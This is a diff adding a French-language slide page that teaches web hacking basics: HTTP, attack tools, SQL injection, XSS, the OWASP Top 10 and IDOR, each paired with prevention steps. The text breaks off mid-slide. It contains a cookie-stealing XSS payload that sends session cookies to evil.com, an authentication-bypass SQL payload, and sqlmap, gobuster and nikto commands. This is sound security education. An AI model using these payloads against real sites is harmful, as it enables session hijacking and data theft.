@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Hacking · SooPHA Learn</title>
+<link rel="stylesheet" href="../css/global.css">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="../js/config.js"></script>
+<script src="../js/auth.js"></script>
+<style>
+html, body { overflow: hidden; height: 100%; }
+body::before { height: 3px; }
+#topbar { position:fixed; top:3px; left:0; right:0; z-index:200; display:flex; justify-content:space-between; align-items:center; padding:.5rem 1.5rem; background:rgba(2,4,10,0.97); border-bottom:1px solid rgba(255,136,0,.18); backdrop-filter:blur(12px); font-size:.65rem; color:rgba(255,136,0,.4); }
+.tb-left { display:flex; gap:1.5rem; align-items:center; }
+.tb-right { display:flex; gap:1.2rem; align-items:center; }
+.tb-back { color:rgba(255,136,0,.5); text-decoration:none; font-size:.65rem; letter-spacing:.08em; transition:color .2s; }
+.tb-back:hover { color:#ff8800; opacity:1; }
+.tb-dot { width:6px; height:6px; background:#ff8800; border-radius:50%; display:inline-block; animation:blink 1.4s infinite; margin-right:.3rem; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+.tb-user { font-family:var(--mono); font-size:.62rem; color:rgba(255,136,0,.4); }
+#progress-top { position:fixed; top:34px; left:0; right:0; z-index:200; height:2px; background:rgba(255,136,0,.06); }
+#progress-fill { height:100%; background:#ff8800; box-shadow:0 0 8px #ff8800; transition:width .5s ease; }
+#scanlines { position:fixed; inset:0; z-index:1; pointer-events:none; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px); }
+#vignette  { position:fixed; inset:0; z-index:1; pointer-events:none; background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.65) 100%); }
+canvas#matrix { position:fixed; inset:0; z-index:0; opacity:.04; pointer-events:none; }
+#slides { position:fixed; inset:0; z-index:10; padding-top:36px; padding-bottom:44px; overflow:hidden; }
+.slide { position:absolute; inset:0; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:1.5rem 4rem; opacity:0; pointer-events:none; transition:opacity .4s ease,transform .4s ease; transform:translateX(40px); overflow-y:auto; }
+.slide.active { opacity:1; pointer-events:all; transform:translateX(0); }
+.slide.exit   { opacity:0; transform:translateX(-40px); }
+.gabon-bar { display:flex; height:3px; width:60px; border-radius:2px; overflow:hidden; margin:.6rem 0; }
+.gabon-bar span:nth-child(1){flex:1;background:#009e60}.gabon-bar span:nth-child(2){flex:1;background:#fcd116}.gabon-bar span:nth-child(3){flex:1;background:#003189}
+.slide-tag { font-family:var(--mono); font-size:.6rem; letter-spacing:.3em; color:rgba(255,136,0,.35); text-transform:uppercase; margin-bottom:.5rem; }
+.slide h1 { font-family:var(--display)!important; font-weight:900!important; font-size:clamp(1.8rem,3.5vw,2.8rem)!important; color:#fff!important; text-align:center; letter-spacing:.1em; line-height:1.15; margin-bottom:.4rem!important; text-shadow:0 0 40px #ff8800,0 0 80px rgba(255,136,0,.2); }
+.slide h2 { font-family:var(--display)!important; font-weight:700!important; font-size:clamp(1.1rem,2vw,1.7rem)!important; color:#ff8800!important; letter-spacing:.08em; margin-bottom:1rem!important; }
+.slide h3 { font-family:var(--display)!important; font-weight:400!important; font-size:clamp(.8rem,1.2vw,1rem)!important; color:rgba(255,136,0,.55)!important; letter-spacing:.2em; text-transform:uppercase; margin-bottom:1.5rem!important; }
+.card { background:rgba(2,8,18,.88); border:1px solid rgba(255,136,0,.18); border-radius:2px; padding:1.4rem 1.8rem; position:relative; backdrop-filter:blur(10px); max-width:880px; width:100%; }
+.card::before { content:''; position:absolute; top:-1px; left:-1px; width:14px; height:14px; border-top:2px solid #ff8800; border-left:2px solid #ff8800; }
+.card::after  { content:''; position:absolute; bottom:-1px; right:-1px; width:14px; height:14px; border-bottom:2px solid #ff8800; border-right:2px solid #ff8800; }
+.bullets { list-style:none; display:flex; flex-direction:column; gap:.55rem; }
+.bullets li { display:flex; align-items:flex-start; gap:.7rem; font-family:var(--body); font-size:clamp(.8rem,1.3vw,.95rem); color:rgba(220,230,255,.85); line-height:1.5; animation:fadeIn .4s ease both; }
+.bullets li::before { content:'▶'; color:#ff8800; font-size:.55rem; margin-top:.35rem; flex-shrink:0; }
+.bullets li strong { color:#fff; }
+.bullets li.ok::before { content:'✅'; font-size:.7rem; }
+.bullets li.warn::before { content:'⚠'; color:#ffd700; font-size:.7rem; }
+.bullets li.danger::before { content:'🔴'; font-size:.7rem; }
+@keyframes fadeIn { from{opacity:0;transform:translateX(8px)} to{opacity:1;transform:translateX(0)} }
+.bullets li:nth-child(1){animation-delay:.05s}.bullets li:nth-child(2){animation-delay:.12s}.bullets li:nth-child(3){animation-delay:.2s}.bullets li:nth-child(4){animation-delay:.28s}.bullets li:nth-child(5){animation-delay:.36s}
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:1rem; max-width:880px; width:100%; }
+.pill { display:inline-block; padding:.25rem .7rem; font-size:.65rem; letter-spacing:.06em; border-radius:2px; font-family:var(--mono); }
+.pill-green  { background:rgba(0,255,136,.1);  border:1px solid rgba(0,255,136,.3);  color:#00ff88; }
+.pill-red    { background:rgba(255,68,102,.1); border:1px solid rgba(255,68,102,.3); color:#ff4466; }
+.pill-yellow { background:rgba(255,215,0,.08); border:1px solid rgba(255,215,0,.3);  color:#ffd700; }
+.pill-blue   { background:rgba(0,170,255,.08); border:1px solid rgba(0,170,255,.3);  color:#00aaff; }
+.pill-orange { background:rgba(255,136,0,.1);  border:1px solid rgba(255,136,0,.3);  color:#ff8800; }
+.pill-purple { background:rgba(200,136,255,.1);border:1px solid rgba(200,136,255,.3);color:#cc88ff; }
+.quote { border-left:3px solid #ff8800; padding:.7rem 1rem; background:rgba(255,136,0,.04); font-family:var(--body); font-style:italic; font-size:clamp(.9rem,1.5vw,1.15rem); color:#e0e8ff; line-height:1.6; }
+.terminal { background:rgba(0,0,4,.7); border:1px solid rgba(255,136,0,.15); border-left:3px solid #ff8800; padding:.8rem 1.1rem; font-family:var(--mono); font-size:.78rem; color:rgba(255,136,0,.8); line-height:1.8; }
+.term-prompt { color:#ff8800; }
+.term-out    { color:rgba(255,255,255,.5); }
+.hdiv { display:flex; align-items:center; gap:1rem; color:rgba(255,136,0,.2); font-size:.62rem; letter-spacing:.2em; margin:.8rem 0; }
+.hdiv::before,.hdiv::after { content:''; flex:1; height:1px; background:rgba(255,136,0,.12); }
+@keyframes glitch {
+  0%,90%,100%{text-shadow:0 0 40px #ff8800,0 0 80px rgba(255,136,0,.2)}
+  91%{text-shadow:-3px 0 #ff0044,3px 0 #00ffff;transform:translate(-2px)}
+  93%{text-shadow:3px 0 #ff0044,-3px 0 #00ffff;transform:translate(2px)}
+  95%{text-shadow:0 0 40px #ff8800;transform:translate(0)}
+}
+.glitch { animation:glitch 7s infinite; }
+#qcm-overlay { position:fixed; inset:0; z-index:300; background:rgba(2,4,12,.97); display:none; flex-direction:column; align-items:center; justify-content:center; padding:2rem; }
+#qcm-overlay.show { display:flex; animation:fadeInOv .3s ease; }
+@keyframes fadeInOv { from{opacity:0} to{opacity:1} }
+.qcm-box { max-width:680px; width:100%; background:rgba(2,8,18,.97); border:1px solid rgba(255,136,0,.25); border-radius:2px; padding:2.5rem; position:relative; box-shadow:0 0 40px rgba(255,136,0,.1); }
+.qcm-box::before { content:''; position:absolute; top:-1px; left:-1px; width:18px; height:18px; border-top:2px solid #ff8800; border-left:2px solid #ff8800; }
+.qcm-box::after  { content:''; position:absolute; bottom:-1px; right:-1px; width:18px; height:18px; border-bottom:2px solid #ff8800; border-right:2px solid #ff8800; }
+.qcm-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem; padding-bottom:1rem; border-bottom:1px solid rgba(255,136,0,.15); }
+.qcm-label { font-family:var(--mono); font-size:.6rem; letter-spacing:.3em; color:rgba(255,136,0,.4); text-transform:uppercase; }
+.qcm-prog  { font-family:var(--mono); font-size:.65rem; color:rgba(255,136,0,.35); }
+.qcm-saving { font-family:var(--mono); font-size:.62rem; color:rgba(255,136,0,.35); margin-bottom:.5rem; display:none; }
+.qcm-saving.show { display:block; }
+.qcm-question { font-family:var(--display); font-size:clamp(.9rem,1.8vw,1.1rem); font-weight:700; color:#fff; line-height:1.4; margin-bottom:1.8rem; }
+.qcm-options { display:flex; flex-direction:column; gap:.65rem; margin-bottom:1.5rem; }
+.qcm-option { display:flex; align-items:flex-start; gap:.9rem; padding:.8rem 1.1rem; background:rgba(0,0,8,.3); border:1px solid rgba(255,136,0,.1); cursor:pointer; border-radius:2px; transition:all .15s; font-family:var(--body); font-size:.88rem; color:rgba(200,210,255,.75); line-height:1.4; }
+.qcm-option:hover:not(.disabled) { border-color:rgba(255,136,0,.35); background:rgba(255,136,0,.06); color:rgba(220,230,255,.95); }
+.qcm-option.correct  { border-color:#ff8800!important; background:rgba(255,136,0,.12)!important; color:#ff8800!important; }
+.qcm-option.wrong    { border-color:#ff4466!important; background:rgba(255,68,102,.08)!important; color:#ff4466!important; }
+.qcm-option.disabled { cursor:default; pointer-events:none; }
+.option-letter { font-family:var(--display); font-size:.68rem; font-weight:700; color:rgba(255,136,0,.4); min-width:18px; flex-shrink:0; margin-top:.1rem; }
+.qcm-option.correct .option-letter,.qcm-option.wrong .option-letter { color:inherit; }
+.qcm-feedback { padding:.8rem 1rem; border-radius:2px; font-family:var(--mono); font-size:.8rem; line-height:1.5; display:none; margin-bottom:1.2rem; }
+.qcm-feedback.correct { background:rgba(255,136,0,.07); border:1px solid rgba(255,136,0,.2); color:rgba(255,136,0,.9); }
+.qcm-feedback.wrong   { background:rgba(255,68,102,.06); border:1px solid rgba(255,68,102,.2); color:rgba(255,100,130,.9); }
+.qcm-btn { font-family:var(--display); font-size:.75rem; font-weight:700; letter-spacing:.12em; padding:.7rem 1.8rem; background:#ff8800; color:var(--bg); border:none; cursor:pointer; clip-path:polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%); transition:all .2s; text-transform:uppercase; display:none; }
+.qcm-btn.show { display:inline-block; }
+#completion-modal { position:fixed; inset:0; z-index:400; background:rgba(0,0,0,.9); display:none; align-items:center; justify-content:center; padding:2rem; }
+#completion-modal.show { display:flex; animation:fadeInOv .3s ease; }
+.completion-box { max-width:500px; width:100%; background:rgba(2,8,18,.98); border:1px solid rgba(255,136,0,.3); border-radius:2px; padding:3rem 2.5rem; text-align:center; box-shadow:0 0 60px rgba(255,136,0,.15); position:relative; }
+.completion-box::before { content:''; position:absolute; top:-1px; left:-1px; width:20px; height:20px; border-top:2px solid #ff8800; border-left:2px solid #ff8800; }
+.completion-icon  { font-size:4rem; margin-bottom:1rem; }
+.completion-title { font-family:var(--display); font-size:1.5rem; font-weight:900; color:#fff; margin-bottom:.5rem; }
+.completion-score { font-family:var(--display); font-size:3.5rem; font-weight:900; color:#ff8800; text-shadow:0 0 30px #ff8800; margin:1rem 0; }
+.completion-sub   { font-family:var(--mono); font-size:.78rem; color:rgba(255,136,0,.5); margin-bottom:.5rem; line-height:1.6; }
+.completion-saved { font-family:var(--mono); font-size:.68rem; color:rgba(255,136,0,.35); margin-bottom:1.5rem; }
+.completion-btn { font-family:var(--display); font-size:.78rem; font-weight:700; letter-spacing:.12em; padding:.8rem 1.8rem; text-decoration:none; display:inline-block; clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%); cursor:pointer; border:none; margin:.3rem; text-transform:uppercase; transition:all .2s; }
+.completion-btn-primary   { background:#ff8800; color:var(--bg); }
+.completion-btn-primary:hover { box-shadow:0 0 20px rgba(255,136,0,.5); opacity:1; }
+.completion-btn-secondary { background:transparent; color:#ff8800; border:1px solid rgba(255,136,0,.3)!important; clip-path:none; border-radius:2px; }
+#bottombar { position:fixed; bottom:0; left:0; right:0; z-index:200; display:flex; justify-content:space-between; align-items:center; padding:.5rem 1.5rem; background:rgba(2,4,12,.97); border-top:1px solid rgba(255,136,0,.15); backdrop-filter:blur(12px); }
+.nav-btn { background:transparent; border:1px solid rgba(255,136,0,.2); color:rgba(255,136,0,.55); padding:.32rem .9rem; font-family:var(--mono); font-size:.65rem; cursor:pointer; transition:all .2s; clip-path:polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%); }
+.nav-btn:hover { border-color:#ff8800; color:#ff8800; background:rgba(255,136,0,.05); }
+.nav-btn:disabled { opacity:.2; cursor:not-allowed; }
+#slide-counter { font-family:var(--display); font-size:.72rem; color:#ff8800; }
+.qcm-indicator { font-family:var(--mono); font-size:.62rem; color:rgba(255,215,0,.5); letter-spacing:.08em; }
+@media (max-width:768px) { .slide { padding:1rem 1.2rem; } .grid2 { grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div id="scanlines"></div>
+<div id="vignette"></div>
+<div id="topbar">
+  <div class="tb-left">
+    <a href="dashboard.html" class="tb-back">← Dashboard</a>
+    <span>Web Hacking</span>
+  </div>
+  <div class="tb-right">
+    <span class="tb-user" id="tb-username"></span>
+    <span><span class="tb-dot"></span>SooPHA Learn</span>
+  </div>
+</div>
+<div id="progress-top"><div id="progress-fill" style="width:0%"></div></div>
+<div id="slides">
+
+<div class="slide active" data-index="0">
+  <div class="slide-tag">// Web Hacking — Introduction</div>
+  <h1 class="glitch">WEB HACKING</h1>
+  <div class="gabon-bar"><span></span><span></span><span></span></div>
+  <h3>Comprendre, Exploiter, Défendre</h3>
+  <div style="display:flex;gap:.7rem;flex-wrap:wrap;justify-content:center;margin-top:.8rem">
+    <span class="pill pill-red">💉 Injections</span>
+    <span class="pill pill-orange">🌐 XSS</span>
+    <span class="pill pill-blue">🔬 Burp Suite</span>
+    <span class="pill pill-yellow">⚔️ OWASP Top 10</span>
+  </div>
+  <div style="margin-top:1.5rem" class="terminal"><span class="term-prompt">hacker@web:~$ </span><span class="term-out">// 75% des applications web ont des vulnérabilités critiques</span></div>
+  <div style="margin-top:1.5rem;font-size:.68rem;color:rgba(255,136,0,.25);letter-spacing:.15em">← → POUR NAVIGUER</div>
+</div>
+
+<div class="slide" data-index="1">
+  <div class="slide-tag">// 01 · Le modèle Web</div>
+  <h2>Comment fonctionne une application web ?</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">🌐 ARCHITECTURE</div>
+      <ul class="bullets">
+        <li><strong>Client</strong> — ton navigateur envoie des requêtes HTTP</li>
+        <li><strong>Serveur Web</strong> — Apache, Nginx traite les requêtes</li>
+        <li><strong>Application</strong> — PHP, Python, Node.js génère la réponse</li>
+        <li><strong>Base de données</strong> — MySQL, PostgreSQL stocke les données</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">🔄 FLUX D'UNE REQUÊTE</div>
+      <div class="terminal" style="font-size:.75rem">
+        <span class="term-prompt">Browser → </span><span class="term-out">GET /login HTTP/1.1</span><br>
+        <span class="term-prompt">Server  → </span><span class="term-out">200 OK + HTML</span><br>
+        <span class="term-prompt">Browser → </span><span class="term-out">POST /login (user+pass)</span><br>
+        <span class="term-prompt">Server  → </span><span class="term-out">302 Redirect /dashboard</span>
+      </div>
+      <div style="margin-top:.8rem;font-family:var(--body);font-size:.78rem;color:rgba(255,200,150,.7)">💡 Chaque interaction est une potentielle surface d'attaque</div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="2" data-qcm="2">
+  <div class="slide-tag">// 02 · HTTP & HTTPS</div>
+  <h2>HTTP — Le protocole du Web</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">📋 MÉTHODES HTTP</div>
+      <ul class="bullets">
+        <li><strong>GET</strong> — récupère une ressource (params dans l'URL)</li>
+        <li><strong>POST</strong> — envoie des données (formulaires, login)</li>
+        <li><strong>PUT / PATCH</strong> — modifie une ressource</li>
+        <li><strong>DELETE</strong> — supprime une ressource</li>
+      </ul>
+      <div style="margin-top:.8rem;font-family:var(--mono);font-size:.7rem;color:rgba(255,136,0,.4)">⚠️ GET = visible dans l'URL → jamais de mot de passe en GET !</div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">🔐 COOKIES & SESSIONS</div>
+      <ul class="bullets">
+        <li>Le serveur crée une <strong>session</strong> après authentification</li>
+        <li>Un <strong>cookie</strong> stocke l'ID de session dans le navigateur</li>
+        <li>Voler ce cookie = <strong>usurper l'identité</strong> de l'utilisateur</li>
+        <li>Flag <strong>HttpOnly</strong> protège contre le vol par XSS</li>
+      </ul>
+      <div class="terminal" style="font-size:.7rem;margin-top:.8rem"><span class="term-prompt">Set-Cookie: </span><span class="term-out">session=abc123; HttpOnly; Secure</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="3" data-qcm="3">
+  <div class="slide-tag">// 03 · Outils</div>
+  <h2>Les outils du hacker web</h2>
+  <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;max-width:900px;width:100%">
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">🔬</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#ff8800;margin-bottom:.4rem;font-weight:700">BURP SUITE</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(220,200,180,.7);line-height:1.4">Proxy HTTP qui intercepte et modifie les requêtes en temps réel. Standard de l'industrie pour les pentests web.</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(255,136,0,.4)">Intercept · Repeater · Intruder · Scanner</div>
+    </div>
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">🛠️</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#00aaff;margin-bottom:.4rem;font-weight:700">DEV TOOLS (F12)</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(200,220,255,.7);line-height:1.4">Intégré au navigateur. Network pour voir les requêtes, Console pour JavaScript, Storage pour les cookies et localStorage.</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(0,170,255,.4)">Network · Console · Sources · Application</div>
+    </div>
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">📡</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#00ff88;margin-bottom:.4rem;font-weight:700">OWASP ZAP</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(200,255,220,.7);line-height:1.4">Alternative open source à Burp Suite. Scanner automatique de vulnérabilités. Idéal pour débuter.</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(0,255,136,.4)">100% gratuit · Open Source</div>
+    </div>
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">💉</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#ff4466;margin-bottom:.4rem;font-weight:700">SQLMAP</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(255,200,200,.7);line-height:1.4">Automatise la détection et l'exploitation des injections SQL. Teste tous les paramètres d'une URL.</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(255,68,102,.4)">sqlmap -u "http://target.com?id=1"</div>
+    </div>
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">🔍</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#cc88ff;margin-bottom:.4rem;font-weight:700">DIRB / GOBUSTER</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(220,200,255,.7);line-height:1.4">Découvre les répertoires et fichiers cachés sur un serveur web. Trouve /admin, /backup, /config...</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(200,136,255,.4)">gobuster dir -u http://target -w wordlist</div>
+    </div>
+    <div class="card" style="padding:1.1rem">
+      <div style="font-size:1.8rem;margin-bottom:.5rem">🌐</div>
+      <div style="font-family:var(--display);font-size:.75rem;color:#ffd700;margin-bottom:.4rem;font-weight:700">NIKTO</div>
+      <div style="font-family:var(--body);font-size:.75rem;color:rgba(255,240,200,.7);line-height:1.4">Scanner de vulnérabilités serveur. Détecte configs dangereuses, fichiers exposés, versions obsolètes.</div>
+      <div style="margin-top:.4rem;font-size:.6rem;color:rgba(255,215,0,.4)">nikto -h http://target.com</div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="4" data-qcm="4">
+  <div class="slide-tag">// 04 · SQL Injection</div>
+  <h2 style="color:#ff4466!important;text-shadow:0 0 20px rgba(255,68,102,.4)!important">Injection SQL — La reine des vulnérabilités</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.6rem">🎯 COMMENT ÇA MARCHE</div>
+      <div style="font-family:var(--body);font-size:.8rem;color:rgba(220,200,200,.8);line-height:1.5;margin-bottom:.8rem">Le code SQL de la requête est construit avec des données utilisateur <strong style="color:#fff">non filtrées</strong>.</div>
+      <div class="terminal" style="font-size:.72rem">
+        <span class="term-prompt">Requête normale :</span><br>
+        <span class="term-out">SELECT * FROM users WHERE user='admin' AND pass='1234'</span><br><br>
+        <span class="term-prompt">Payload injecté :</span> <span style="color:#ff4466">' OR '1'='1</span><br>
+        <span class="term-out">SELECT * FROM users WHERE user='admin' AND pass='' OR '1'='1'</span><br>
+        <span style="color:#ff4466">→ TOUJOURS VRAI = ACCÈS ACCORDÉ !</span>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.6rem">💥 IMPACTS POSSIBLES</div>
+      <ul class="bullets">
+        <li class="danger">Contourner l'authentification (login sans mot de passe)</li>
+        <li class="danger">Lire toute la base de données (mots de passe, données clients)</li>
+        <li class="danger">Modifier ou supprimer des données</li>
+        <li class="danger">Exécuter des commandes sur le serveur (RCE)</li>
+      </ul>
+      <div class="hdiv">PRÉVENTION</div>
+      <ul class="bullets">
+        <li class="ok"><strong>Requêtes préparées</strong> (prepared statements)</li>
+        <li class="ok"><strong>ORM</strong> (Sequelize, Django ORM)</li>
+        <li class="ok">Validation et <strong>filtrage</strong> des entrées</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="5" data-qcm="5">
+  <div class="slide-tag">// 05 · XSS</div>
+  <h2 style="color:#ff8800!important">Cross-Site Scripting (XSS)</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">🎭 DÉFINITION</div>
+      <div style="font-family:var(--body);font-size:.8rem;line-height:1.5;margin-bottom:.8rem;color:rgba(220,200,180,.8)">Injection de <strong style="color:#fff">code JavaScript malveillant</strong> dans une page web consultée par d'autres utilisateurs.</div>
+      <div class="terminal" style="font-size:.72rem">
+        <span class="term-prompt">Payload XSS :</span><br>
+        <span style="color:#ff8800">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+      </div>
+      <div style="margin-top:.8rem;font-family:var(--display);font-size:.68rem;color:rgba(255,68,102,.5)">→ Vol de cookies de session → Usurpation d'identité</div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">📊 3 TYPES DE XSS</div>
+      <ul class="bullets">
+        <li><strong>Reflected</strong> — payload dans l'URL, exécuté une fois<br><span style="font-size:.72rem;color:rgba(220,200,180,.5)">?search=&lt;script&gt;alert(1)&lt;/script&gt;</span></li>
+        <li><strong>Stored</strong> — payload en base de données, exécuté à chaque visite<br><span style="font-size:.72rem;color:rgba(220,200,180,.5)">Le plus dangereux — commentaires, profils</span></li>
+        <li><strong>DOM-based</strong> — manipulation du DOM côté client<br><span style="font-size:.72rem;color:rgba(220,200,180,.5)">Pas de serveur impliqué</span></li>
+      </ul>
+      <div class="hdiv">PRÉVENTION</div>
+      <ul class="bullets">
+        <li class="ok">Échapper les caractères HTML (<code>&lt; &gt; " '</code>)</li>
+        <li class="ok"><strong>Content Security Policy</strong> (CSP) header</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="6" data-qcm="6">
+  <div class="slide-tag">// 06 · OWASP Top 10</div>
+  <h2>OWASP Top 10 — Les vulnérabilités les plus critiques</h2>
+  <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:.6rem;max-width:900px;width:100%">
+    <div style="border:1px solid rgba(255,68,102,.25);background:rgba(255,68,102,.04);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#ff4466;margin-bottom:.25rem;font-weight:700">A01 — Broken Access Control</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(220,200,200,.7)">Accès à des ressources sans autorisation. Ex: voir les données d'un autre utilisateur en changeant l'ID dans l'URL.</div>
+    </div>
+    <div style="border:1px solid rgba(255,136,0,.25);background:rgba(255,136,0,.04);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#ff8800;margin-bottom:.25rem;font-weight:700">A02 — Cryptographic Failures</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(230,210,190,.7)">Données sensibles transmises ou stockées sans chiffrement. Mots de passe en MD5, HTTP sans TLS.</div>
+    </div>
+    <div style="border:1px solid rgba(255,68,102,.3);background:rgba(255,68,102,.06);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#ff4466;margin-bottom:.25rem;font-weight:700">A03 — Injection (SQLi, XSS...)</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(220,200,200,.7)">Données non filtrées interprétées comme du code. SQL, commandes shell, LDAP, XML...</div>
+    </div>
+    <div style="border:1px solid rgba(255,215,0,.2);background:rgba(255,215,0,.04);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#ffd700;margin-bottom:.25rem;font-weight:700">A04 — Insecure Design</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(230,220,180,.7)">Failles de conception architecturale. Absence de rate-limiting, logique métier exploitable.</div>
+    </div>
+    <div style="border:1px solid rgba(0,170,255,.2);background:rgba(0,170,255,.04);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#00aaff;margin-bottom:.25rem;font-weight:700">A05 — Security Misconfiguration</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(200,220,255,.7)">Config par défaut non changée, ports inutiles ouverts, messages d'erreur verbeux.</div>
+    </div>
+    <div style="border:1px solid rgba(0,255,136,.2);background:rgba(0,255,136,.04);padding:.75rem">
+      <div style="font-family:var(--display);font-size:.65rem;color:#00ff88;margin-bottom:.25rem;font-weight:700">A07 — Authentication Failures</div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(200,255,220,.7)">Pas de MFA, sessions sans expiration, mots de passe faibles autorisés.</div>
+    </div>
+  </div>
+  <div style="margin-top:.8rem;font-family:var(--mono);font-size:.68rem;color:rgba(255,136,0,.35)">→ Source : owasp.org · Référence mondiale pour la sécurité web</div>
+</div>
+
+<div class="slide" data-index="7" data-qcm="7">
+  <div class="slide-tag">// 07 · Broken Access Control</div>
+  <h2>IDOR — Insecure Direct Object Reference</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">🎯 C'EST QUOI</div>
+      <div style="font-family:var(--body);font-size:.82rem;color:rgba(220,200,180,.8);line-height:1.5;margin-bottom:.8rem">Un IDOR permet d'accéder aux données d'un autre utilisateur en modifiant simplement un <strong style="color:#fff">identifiant dans l'URL ou la requête</strong>.</div>
+      <div class="terminal" style="font-size:.72rem">
+        <span class="term-prompt">URL normale :</span><br>
+        <span class="term-out">https://bank.ga/account?id=<span style="color:#00ff88">1042</span></span><br><br>
+        <span class="term-prompt">IDOR :</span><br>
+        <span class="term-out">https://bank.ga/account?id=<span style="color:#ff4466">1043</span></span><br>
+        <span style="color:#ff4466">→ Accès aux données du compte 1043 !</span>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.6rem">📊 IMPACT & PRÉVENTION</div>
+      <ul class="bullets">
+        <li class="danger">Lecture des données de n'importe quel utilisateur</li>
+        <li class="danger">Modification des commandes, profils, paramètres d'autrui</li>
+        <li class="danger">Téléchargement de fichiers privés</li>
+      </ul>
+      <div class="hdiv">CORRECTIONS</div>
+      <ul class="bullets">
+        <li class="ok">Vérifier côté serveur que l'utilisateur <strong>a le droit d'accéder</strong> à la ressource</li>
+        <li class="ok">Utiliser des <strong>UUID</strong> non prédictibles plutôt que des IDs séquentiels</li>
+        <li class="ok">Implémenter un contrôle d'accès <strong>basé sur les rôles</strong> (RBAC)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="8" data-qcm="8">
+  <div class="slide-tag">// 08 · Méthodologie Pentest Web</div>
+  <h2>Comment tester une application web ?</h2>
+  <div style="display:flex;flex-direction:column;gap:.6rem;max-width:820px;width:100%">
+    <div style="display:flex;align-items:flex-start;gap:1rem;padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+      <div style="font-family:var(--display);font-size:1.2rem;font-weight:900;color:#ff8800;text-shadow:0 0 10px #ff8800;min-width:28px">01</div>
